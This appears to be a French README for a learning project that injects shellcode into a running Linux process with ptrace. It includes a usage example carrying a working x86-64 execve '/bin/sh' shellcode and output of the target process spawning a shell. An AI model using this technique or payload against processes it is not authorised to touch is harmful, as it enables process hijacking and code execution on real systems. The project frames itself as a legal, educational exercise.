```
   ___            _                 _  _____        _           _   _             
  / _ \__ _ _   _| | ___   __ _  __| | \_   \_ __  (_) ___  ___| |_(_) ___  _ __  
 / /_)/ _` | | | | |/ _ \ / _` |/ _` |  / /\/ '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
/ ___/ (_| | |_| | | (_) | (_| | (_| /\/ /_ | | | || |  __/ (__| |_| | (_) | | | |
\/    \__,_|\__, |_|\___/ \__,_|\__,_\____/ |_| |_|/ |\___|\___|\__|_|\___/|_| |_|
            |___/                                |__/                             
```

# Injection de shellcode dans un processus distant avec ptrace

Ce projet est un exercice en C permettant d’injecter du shellcode dans un processus Linux en utilisant la syscall `ptrace`.

## Description

Le programme s’attache à un processus cible via son PID, lit les registres pour récupérer l’adresse d’instruction courante (RIP), sauvegarde le code original à cette adresse, injecte le shellcode dans la mémoire du processus, reprend son exécution pour exécuter ce shellcode, puis restaure le code original avant de se détacher proprement.

Ce mécanisme est une illustration des techniques d’injection et d’exploitation sous Linux.

## Fonctionnalités

* Attachement au processus cible via `PTRACE_ATTACH`
* Lecture et écriture mémoire avec `PTRACE_PEEKDATA` / `PTRACE_POKEDATA`
* Manipulation des registres grâce à `PTRACE_GETREGS`
* Injection et exécution du shellcode
* Restauration de l’état initial du processus
* Détachement propre avec `PTRACE_DETACH`

## Utilisation

```bash
./injection 453192 "$(echo -ne '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05')"
[*] Attaching to PID 453192...
[*] Reading registers...
[*] Backing up original code at 0x7fdf1ed08687
[*] Injecting payload...
[*] Continuing execution...
[*] Restoring original code...
[*] Detaching...
[+] Injection complete.

./target 
Target alive...
Target alive...
Target alive...
Target alive...
Target alive...
Target alive...
$ ls
injection  injection.c  target  target.c
$
```

## Remerciements

Ce projet m’a beaucoup aidé à comprendre les fondamentaux de l’injection avec ptrace, notamment grâce à cet excellent article :
[https://cocomelonc.github.io/linux/2024/11/22/linux-hacking-3.html](https://cocomelonc.github.io/linux/2024/11/22/linux-hacking-3.html)

---

## Avertissement

Ce programme doit être utilisé uniquement dans un cadre légal et éthique, sur des processus dont vous avez la permission d’interagir.

---